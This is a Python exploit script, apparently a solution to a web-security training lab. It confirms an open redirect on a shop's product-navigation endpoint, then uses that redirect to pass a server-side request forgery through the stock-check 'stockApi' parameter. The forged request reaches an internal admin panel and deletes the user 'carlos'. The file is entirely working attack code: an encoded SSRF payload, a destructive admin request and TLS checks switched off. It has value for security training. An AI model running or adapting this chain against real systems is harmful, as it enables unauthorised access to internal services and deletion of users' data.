#!/usr/bin/python3
import sys
import urllib3
import requests
from bs4 import BeautifulSoup

# Disable warnings related to insecure SSL connections.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define HTTP and HTTPS proxies.
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def delete_carlos(url):
    # Define the vulnerable function path.
    vulnerable_endpoint = '/product/stock'

    # Define the open redirect check endpoint.
    open_redirect_vuln_endpoint = '/product/nextProduct?currentProductId=1&path=https://www.google.com'

    print('[+] Checking for open redirect...')

    # Send a GET request to the open redirect endpoint without following redirects.
    open_redirect_sending_request = requests.get(
        url + open_redirect_vuln_endpoint, allow_redirects=False, proxies=proxies, verify=False
    )

    # Check if the response is a redirect.
    if open_redirect_sending_request.is_redirect or open_redirect_sending_request.status_code in [301, 302, 303, 307,
                                                                                                  308]:
        # Extract the redirect URL from the headers.
        redirect_url = open_redirect_sending_request.headers['Location']

        # Send a GET request to the redirected URL.
        redirected_response = requests.get(redirect_url, proxies=proxies, verify=False)

        # Parse the response HTML using BeautifulSoup.
        soup = BeautifulSoup(redirected_response.text, 'html.parser')

        # Get the title of the page, if available.
        title = soup.title.string if soup.title else "No Title Found"

        # Print the page title.
        print(f"[+] Page Title: {title}")

        # Check if the title contains specific text (e.g., "Google").
        if 'Google' in title:
            print("[+] Open redirect vulnerability confirmed based on title!")
        else:
            print("[-] Expected title not found in the redirected response.")
    else:
        print("[-] No redirects occurred.")

    print('[+] Chaining the SSRF with open redirect...')

    # Craft the payload for the SSRF attack that encoded because it will give you missing path parameter.
    payload = '/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos'
    # Prepare the data to send in the POST request.
    sending_data = {'stockApi': payload}

    print("[*] Sending request to:", url + vulnerable_endpoint)
    print("[*] Payload:", sending_data)

    # Send the POST request with the crafted payload.
    sending_request = requests.post(url + vulnerable_endpoint, data=sending_data, verify=False, proxies=proxies)

    # Define the admin URL to check if the user was deleted.
    admin_url = '/product/nextProduct?currentProductId=1&path=https://192.168.0.12:8080/admin/'

    # Prepare the data to check if Carlos was deleted.
    check_payload = {'stockApi': admin_url}

    # Send a POST request to check the admin page.
    check_request = requests.post(url + vulnerable_endpoint, data=check_payload, verify=False, proxies=proxies)

    # Check if the response text does not contain "Carlos", indicating deletion.
    if 'Carlos' not in check_request.text:
        print('[+] Carlos deleted successfully')
    else:
        print("[-] Unexpected error occurred or user not deleted")


def exploit():
    # Check if the correct number of arguments is provided.
    if len(sys.argv) != 2:
        print("[-] Error: Invalid number of arguments")
        print("[*] Usage of the script is: {} <target_url>".format(sys.argv[0]))
        exit(-1)

    # Get the target URL from the command-line argument.
    url = sys.argv[1]

    # Ensure the URL starts with 'http://' or 'https://'.
    if not url.startswith('http://') and not url.startswith('https://'):
        print("[-] Error: URL should start with 'http://' or 'https://'")
        exit(-1)

    # Call the delete_carlos function with the target URL.
    delete_carlos(url)


if __name__ == "__main__":
    # Entry point of the script. Execute the exploit function.
    exploit()
